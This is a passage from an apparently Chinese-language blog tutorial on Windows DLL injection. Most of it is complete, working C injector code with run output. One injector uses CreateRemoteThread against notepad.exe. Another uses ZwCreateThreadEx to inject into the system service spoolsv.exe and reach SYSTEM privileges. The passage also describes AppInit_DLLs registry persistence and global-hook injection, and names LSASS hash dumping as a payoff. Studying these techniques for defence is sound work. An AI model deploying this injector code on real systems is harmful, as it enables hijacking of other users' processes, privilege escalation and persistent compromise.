class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, dllPath, pathLen, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. PEB Walking 获取 Kernel32 基址 (调用 injector.h 中的函数)</span></span><br><span class="line">    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, <span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hRemoteKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find kernel32.dll in target process via PEB.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found Remote Kernel32 Base: 0x%p\n&quot;</span>, (<span class="type">void</span>*)hRemoteKernel32);</span><br><span class="line">    <span class="comment">// 4. 计算 LoadLibraryW 的远程地址</span></span><br><span class="line">    HMODULE hLocalKernel32 = GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="comment">// 偏移量计算</span></span><br><span class="line">    <span class="type">uintptr_t</span> offset = (<span class="type">uintptr_t</span>)pLocalLoadLibrary - (<span class="type">uintptr_t</span>)hLocalKernel32;</span><br><span class="line">    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((<span class="type">uintptr_t</span>)hRemoteKernel32 + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Calculated Remote LoadLibraryA: 0x%p\n&quot;</span>, pRemoteLoadLibrary);</span><br><span class="line">    <span class="comment">// 5. 创建远程线程</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pRemoteLoadLibrary, pRemoteMem, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] CreateRemoteThread failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Remote thread created. Waiting for execution...\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 1. 等待线程结束 (即 LoadLibrary 执行完毕)</span></span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        <span class="comment">// 2. 获取线程退出码 (这就是 LoadLibrary 的返回值)</span></span><br><span class="line">        DWORD exitCode = <span class="number">0</span>;</span><br><span class="line">        GetExitCodeThread(hThread, &amp;exitCode);</span><br><span class="line">        <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection FAILED. LoadLibrary returned NULL.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    Possible causes:\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    1. DLL path is incorrect (Target process can&#x27;t find it).\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    2. Architecture mismatch (Injecting 32-bit DLL into 64-bit Process).\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    3. Dependency missing.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n&quot;</span>, exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;[+] Remote thread created successfully.\n&quot;);</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="comment">// 使用 GetFullPathNameW</span></span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDll.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用 injector.h 中的函数</span></span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Process not found. Make sure it is running.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Target PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Attempting injection via PEB walking (Compact Version)...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (InjectDLL(pid, dllPath)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection sequence completed successfully.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-4-攻击效果"><a href="#1-4-攻击效果" class="headerlink" title="1.4 攻击效果"></a>1.4 攻击效果</h4><ul><li><strong>效果</strong> ：能够控制任何当前用户权限下的普通进程（如 Notepad, Chrome）。</li><li><strong>局限</strong> ：在 Windows Vista 以后，由于 Session 0 隔离机制，无法使用此 API 向系统服务注入。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Exploooosion\Desktop&gt; .\Project4.exe                                                                        [+] Target PID: 9204                                                                                                    [*] Attempting injection via PEB walking (Compact Version)...                                                           [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryA: 0x00007FF8AABE0220                                                                  [+] Remote thread created. Waiting for execution...                                                                     [+] Injection SUCCESS. Remote DLL Handle: 0x64780000                                                                    [+] Injection sequence completed successfully.  </span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-12-windows_dll_injection/1765524982009.png" alt="1765524982009"></p><h3 id="突破-Session-0-隔离注入-Session-0-Bypass"><a href="#突破-Session-0-隔离注入-Session-0-Bypass" class="headerlink" title="突破 Session 0 隔离注入 (Session 0 Bypass)"></a>突破 Session 0 隔离注入 (Session 0 Bypass)</h3><p>针对系统服务和高权限进程的注入技术。</p><h4 id="技术原理-1"><a href="#技术原理-1" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 将服务和系统核心进程运行在 Session 0，而用户进程运行在 Session 1+。<code>CreateRemoteThread</code> 在跨 Session 操作时会失败。此技术通过调用底层的 Native API (<code>ZwCreateThreadEx</code>) 直接与内核交互，绕过 Win32 子系统的 Session 检查。</p><h4 id="实现方法与流程-参考-session0bypass-c"><a href="#实现方法与流程-参考-session0bypass-c" class="headerlink" title="实现方法与流程 (参考 session0bypass.c)"></a>实现方法与流程 (参考 <code>session0bypass.c</code>)</h4><p>流程的前半部分（打开进程、分配内存、写入路径）与经典注入完全一致。唯一的区别在于最后一步“创建线程”的方式。</p><h4 id="核心-API-及作用"><a href="#核心-API-及作用" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>OpenProcess</code> &#x2F; <code>VirtualAllocEx</code> &#x2F; <code>WriteProcessMemory</code>：作用同上。</li><li><code>GetModuleHandle(&quot;ntdll.dll&quot;)</code> &amp; <code>GetProcAddress</code>：获取 <code>ntdll.dll</code> 中的未文档化函数地址。</li><li><code>ZwCreateThreadEx(...)</code>： <strong>核心触发点</strong> 。这是一个内核级 API，比 <code>CreateRemoteThread</code> 更底层。它允许在特定的标志位设置下，忽略 Session 隔离限制，在 Session 0 的进程（如 <code>spoolsv.exe</code>, <code>svchost.exe</code>）中创建线程。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 DLL 注入的核心逻辑</span></span><br><span class="line">BOOL <span class="title function_">InjectDLL</span><span class="params">(DWORD pid, <span class="type">const</span> <span class="type">wchar_t</span>* dllPath)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取目标进程句柄</span></span><br><span class="line">    <span class="comment">// 注意：操作 Session 0 服务进程通常需要 SeDebugPrivilege</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> pathLen = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    <span class="comment">// 2. 在目标进程分配内存</span></span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathLen, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathLen, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. PEB Walking 获取 Kernel32 基址</span></span><br><span class="line">    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, <span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hRemoteKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find kernel32.dll in target process via PEB.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found Remote Kernel32 Base: 0x%p\n&quot;</span>, (<span class="type">void</span>*)hRemoteKernel32);</span><br><span class="line">    <span class="comment">// 5. 计算 LoadLibraryW 的远程地址</span></span><br><span class="line">    HMODULE hLocalKernel32 = GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="type">uintptr_t</span> offset = (<span class="type">uintptr_t</span>)pLocalLoadLibrary - (<span class="type">uintptr_t</span>)hLocalKernel32;</span><br><span class="line">    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((<span class="type">uintptr_t</span>)hRemoteKernel32 + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Calculated Remote LoadLibraryW: 0x%p\n&quot;</span>, pRemoteLoadLibrary);</span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    <span class="comment">//         使用 ZwCreateThreadEx 绕过 Session 0 隔离</span></span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hNtdll = GetModuleHandleW(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hNtdll) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load ntdll.dll\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取 ZwCreateThreadEx 地址</span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!ZwCreateThreadEx) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] GetProcAddress for ZwCreateThreadEx failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Calling ZwCreateThreadEx to bypass Session 0 isolation...\n&quot;</span>);</span><br><span class="line">    DWORD status = ZwCreateThreadEx(</span><br><span class="line">        &amp;hThread, </span><br><span class="line">        PROCESS_ALL_ACCESS, </span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        hProcess, </span><br><span class="line">        pRemoteLoadLibrary, </span><br><span class="line">        pRemoteMem, </span><br><span class="line">        <span class="number">0</span>, <span class="comment">// Flags / CreateSuspended = 0</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123; <span class="comment">// 0 表示 STATUS_SUCCESS</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] ZwCreateThreadEx failed. Status: 0x%lx\n&quot;</span>, status);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Remote thread created successfully via Native API.\n&quot;</span>);</span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        DWORD exitCode = <span class="number">0</span>;</span><br><span class="line">        GetExitCodeThread(hThread, &amp;exitCode);</span><br><span class="line">        <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection FAILED. LoadLibrary returned NULL.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n&quot;</span>, exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">    VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// 默认目标改为 spoolsv.exe 以测试 Session 0 注入</span></span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;spoolsv.exe&quot;</span>; </span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (!EnableDebugPrivilege()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to enable SeDebugPrivilege. Run as Administrator!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] SeDebugPrivilege Enabled.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDllforSystem.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;[-] Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找 PID</span></span><br><span class="line">    wprintf(<span class="string">L&quot;[*] Searching for process: %s\n&quot;</span>, targetProcessName);</span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Process not found. Make sure it is running.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Target PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="comment">// 执行注入</span></span><br><span class="line">    <span class="keyword">if</span> (InjectDLL(pid, dllPath)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection sequence completed successfully.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-最厉害的效果"><a href="#攻击效果-最厉害的效果" class="headerlink" title="攻击效果 (最厉害的效果)"></a>攻击效果 (最厉害的效果)</h4><ul><li><strong>权限提升 (Privilege Escalation)</strong> ：成功注入系统服务后，DLL 将获得 <strong>SYSTEM (NT AUTHORITY\SYSTEM)</strong> 权限。</li><li><strong>完全控制</strong> ：这是 Windows 系统中的最高权限，可以无限制地修改系统文件、注册表，甚至转储密码哈希 (LSASS)。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Exploooosion\Desktop&gt; .\Project4.exe                                                                        [+] SeDebugPrivilege Enabled.                                                                                           [*] Searching for process: spoolsv.exe                                                                                  [+] Target PID: 4816                                                                                                    [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryW: 0x00007FF8AABE0220                                                                  [*] Calling ZwCreateThreadEx to bypass Session 0 isolation...                                                           [+] Remote thread created successfully via Native API.                                                                  [+] Injection SUCCESS. Remote DLL Handle: 0x658C0000                                                                    [+] Injection sequence completed successfully.  </span><br><span class="line">========================================</span><br><span class="line">[+] Time: (New Injection Event)</span><br><span class="line">[+] Process ID   : 4816</span><br><span class="line">[+] Session ID   : 0 (0 means System Service Session)</span><br><span class="line">[+] Current User : SYSTEM</span><br><span class="line">[RESULT] -&gt; SUCCESS! Running as NT AUTHORITY\SYSTEM</span><br><span class="line">========================================</span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-12-windows_dll_injection/1765532204002.png" alt="1765532204002"></p><h3 id="注册表注入-Registry-Modification"><a href="#注册表注入-Registry-Modification" class="headerlink" title="注册表注入 (Registry Modification)"></a>注册表注入 (Registry Modification)</h3><p>利用 Windows 加载机制的“被动”注入，常用于持久化。</p><h4 id="技术原理-2"><a href="#技术原理-2" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 的 <code>User32.dll</code> 在初始化时会读取特定的注册表键值。如果配置了 <code>AppInit_DLLs</code>，所有加载 <code>User32.dll</code> 的进程（即几乎所有 GUI 程序）在启动时都会自动加载列表中的 DLL。</p><h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><p>不依赖内存操作 API，而是通过修改注册表键值。</p><ul><li>路径：<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code></li><li>操作：设置 <code>LoadAppInit_DLLs</code> 为 1，并在 <code>AppInit_DLLs</code> 中填入恶意 DLL 路径。</li></ul><h4 id="核心-API-及作用-1"><a href="#核心-API-及作用-1" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>RegOpenKeyEx</code> &#x2F; <code>RegSetValueEx</code>：用于修改注册表键值。</li><li><code>User32.dll</code> (系统机制)：当它被加载时，会自动解析上述注册表项并调用 <code>LoadLibrary</code>。</li></ul><h4 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul><li><strong>持久化 (Persistence)</strong> ：重启后依然有效。</li><li><strong>广撒网</strong> ：系统中几乎所有有界面的程序都会被注入，无需针对特定 PID。</li><li><em>注：在开启 Secure Boot 的现代系统中，此功能通常被禁用。</em></li></ul><h3 id="消息钩子注入-SetWindowsHookEx"><a href="#消息钩子注入-SetWindowsHookEx" class="headerlink" title="消息钩子注入 (SetWindowsHookEx)"></a>消息钩子注入 (SetWindowsHookEx)</h3><p>利用 Windows 消息传递机制的注入，常用于监控用户行为。</p><h4 id="技术原理-3"><a href="#技术原理-3" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 允许程序安装“钩子”来截获系统消息（如键盘、鼠标事件）。如果安装的是 <strong>全局钩子</strong> （Global Hook），操作系统为了让回调函数能处理其他进程的消息，必须将包含回调函数的 DLL 强制映射到所有接收该消息的进程空间中。</p><h4 id="实现方法与流程-参考-hookinjection-c-GlobalHookDll-c"><a href="#实现方法与流程-参考-hookinjection-c-GlobalHookDll-c" class="headerlink" title="实现方法与流程 (参考 hookinjection.c, GlobalHookDll.c)"></a>实现方法与流程 (参考 <code>hookinjection.c</code>, <code>GlobalHookDll.c</code>)</h4><ol><li><strong>编写 DLL</strong> ：DLL 中必须包含钩子回调函数（如 <code>MyHookProc</code>）和导出安装函数。</li><li><strong>安装钩子</strong> ：加载器（Loader）加载 DLL，获取回调函数地址，调用 <code>SetWindowsHookEx</code>。</li><li><strong>触发注入</strong> ：一旦发生相关事件（如鼠标移动、按键），OS 自动将 DLL 注入到受影响的进程。</li></ol><h4 id="核心-API-及作用-2"><a href="#核心-API-及作用-2" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>LoadLibrary</code> &#x2F; <code>GetProcAddress</code>：在加载器中加载恶意 DLL 并获取导出函数地址。</li><li><code>SetWindowsHookEx(WH_GETMESSAGE, hookProc, hDll, 0)</code>： <strong>核心触发点</strong> 。<ul><li><code>WH_GETMESSAGE</code> &#x2F; <code>WH_KEYBOARD</code>：指定监听的消息类型。</li><li>最后一项参数 <code>0</code>：表示 <strong>全局钩子</strong> ，这是触发系统级注入的关键，它告诉 OS 监控所有线程。</li></ul></li><li><code>CallNextHookEx</code>：在 DLL 回调函数中调用，确保消息能继续传递，防止系统卡死。</li></ul><p><code>GlobalHookDll.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 